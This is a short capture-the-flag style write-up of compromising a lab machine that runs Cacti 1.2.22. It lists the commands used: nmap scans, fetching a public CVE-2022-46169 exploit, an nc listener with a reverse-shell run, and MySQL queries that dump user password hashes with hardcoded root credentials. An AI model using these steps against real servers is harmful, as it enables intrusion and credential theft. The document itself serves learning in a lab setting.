I started with 'ping -c4 10.10.11.211' to make sure I had connection to target machine.
Continued with 'nmap -p- 10.10.11.211' to find all open ports for further scanning.
Next I used 'nmap -sVC -p22,80 10.10.11.211' to find out versions of services and headers to the web server.
There is a login page running on cacti version 1.2.22. Looking at the source code there is a lot of JavaScript variables for some reason. 
No plain username or passwords thought. 
Searching 'cacti 1.2.22 exploit' finds a github page that has 'CVE-2022-46169' exploit script for this cacti version.
I downloaded it to my pc with 'wget https://raw.githubusercontent.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/main/CVE-2022-46169.py'.
Started a nc listener with 'nc -lvnp 4444' and ran the script with 'python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.16.34 --LPORT=4444'.
It worked and im in as 'www-data'!

There is a lot of files but one is 'entrypoint.sh' in / that seems interesting. 
Line 'mysql --host=db --user=root --password=root cacti -e "show tables"' gives all tables from the cacti and there is 'user_auth' among many files. 
'mysql --host=db --user=root --password=root cacti -e "select * from user_auth"' show all the contents of user_auth table.
'mysql --host=db --user=root --password=root cacti -e "select username,password from user_auth"' for things that intrest us.
We get usernames and password hashes that can be probably cracked.
I also uploaded 'lse.sh' to help with enumeration. It seems that we are in docker container.
